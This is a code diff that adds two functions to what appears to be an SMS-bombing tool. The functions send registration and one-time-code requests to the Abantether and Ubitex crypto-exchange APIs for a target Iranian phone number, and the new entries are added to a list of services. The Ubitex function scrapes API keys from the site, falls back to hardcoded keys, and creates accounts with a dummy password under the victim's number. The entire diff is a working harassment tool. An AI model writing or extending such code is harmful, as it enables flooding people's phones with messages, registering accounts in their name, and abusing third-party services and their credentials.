@@ -348,6 +348,39 @@ def accounts1606(phone):
         return success
     except: return False
 
+
+def abantether(phone):
+    phone = '0' + phone.split('+98')[-1].split('98')[-1]
+    if not re.match(r"^09\d{9}$", phone): return False
+    try:
+        r = requests.post("https://api.abantether.com/api/v2/auths/register/phone/send", 
+                          json={"phone_number": phone}, headers={"Origin": "https://abantether.com", "Referer": "https://abantether.com/", "Accept-Language": "fa"}, timeout=10)
+        success = r.status_code == 200
+        print(f"[{'+' if success else '-'}] Abantether: {r.status_code}")
+        return success
+    except: return False
+
+
+
+def ubitex(phone):
+    phone = '0' + phone.split('+98')[-1].split('98')[-1]
+    if not re.match(r"^09\d{9}$", phone): return False
+    try:
+        s = requests.Session()
+        res = s.get("https://ubitex.io/", headers={"User-Agent": "Mozilla/5.0"}, timeout=10)
+        key = re.search(r'apiKey["\']?\s*[:=]\s*["\']([^"\']+)["\']', res.text)
+        sec = re.search(r'apiSecret["\']?\s*[:=]\s*["\']([^"\']+)["\']', res.text)
+        
+        payload = {"EmailOrMobile": phone, "Password": "Test123!@#", "phone": phone, "ConfirmPassword": "Test123!@#"}
+        headers = {"apiSecret": sec.group(1) if sec else "8d91944f-ee3c-4d44-9826-6275148637ec", 
+                   "apiKey": key.group(1) if key else "1b285fe3-935f-43f2-9a12-0eaace9f0607", 
+                   "Content-Type": "application/json"}
+        
+        r = s.post("https://api.ubitex.io/api/member/v2/register", json=payload, headers=headers, timeout=10)
+        print(f"[{'+' if r.status_code in [200, 400] else '-'}] Ubitex: {r.status_code}")
+        return r.status_code in [200, 400]
+    except: return False
+
 # ==========================
 # لیست سرویس‌ها
 # ==========================
@@ -356,7 +389,7 @@ services = [
     arzplus, arzunex, azkivam, azno, basalam,
     bimeh, bimehland, bimeparsian, bornosmode, chapmatin,
     darunet, didar24, digikala, ebimename, ibime,
-    padmira, vakiljo
+    padmira, vakiljo, abantether, ubitex
 ]
 
 
